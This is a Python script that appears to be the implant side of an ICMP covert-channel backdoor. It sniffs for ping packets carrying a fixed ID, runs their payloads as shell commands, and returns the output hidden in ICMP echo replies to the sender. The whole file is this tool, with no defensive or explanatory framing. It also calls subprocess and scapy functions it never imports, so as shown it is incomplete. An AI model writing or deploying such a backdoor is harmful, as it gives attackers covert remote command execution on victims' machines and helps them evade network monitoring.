import struct
import socket

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        print(output.decode('utf-8'))
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return str(e)

def send_response(target_ip, response, icmp_id):
    response_data = response.encode()
    icmp_type = 0
    icmp_code = 0
    icmp_checksum = 0
    icmp_sequence = 1

    icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_sequence)
    icmp_checksum = calculate_checksum(icmp_header + response_data)
    icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, socket.htons(icmp_checksum), icmp_id, icmp_sequence)
    icmp_packet = icmp_header + response_data

    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
        sock.sendto(icmp_packet, (target_ip, 0))

def calculate_checksum(data):
    checksum = 0

    if len(data) % 2 != 0:
        data += b"\x00"

    for i in range(0, len(data), 2):
        checksum += (data[i] << 8) + data[i + 1]

    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum += checksum >> 16

    return (~checksum) & 0xffff

def data_parser(packet):
    if packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet[ICMP].id == 12321:
        if packet.haslayer(Raw):
            command = packet[Raw].load.decode('utf-8', errors='ignore')
            if command == "FIEOF":
                print("[+] End of transmission received")
                exit()
            print(f"[+] Executing command: {command}")
            output = execute_command(command)
            send_response(packet[IP].src, output, packet[ICMP].id)

def start_receiver(interface):
    print(f"Listening on interface {interface}...")
    sniff(iface=interface, filter="icmp", prn=data_parser)

def main():
    interface = input("Enter the network interface to listen on: ")
    start_receiver(interface)

if __name__ == "__main__":
    main()
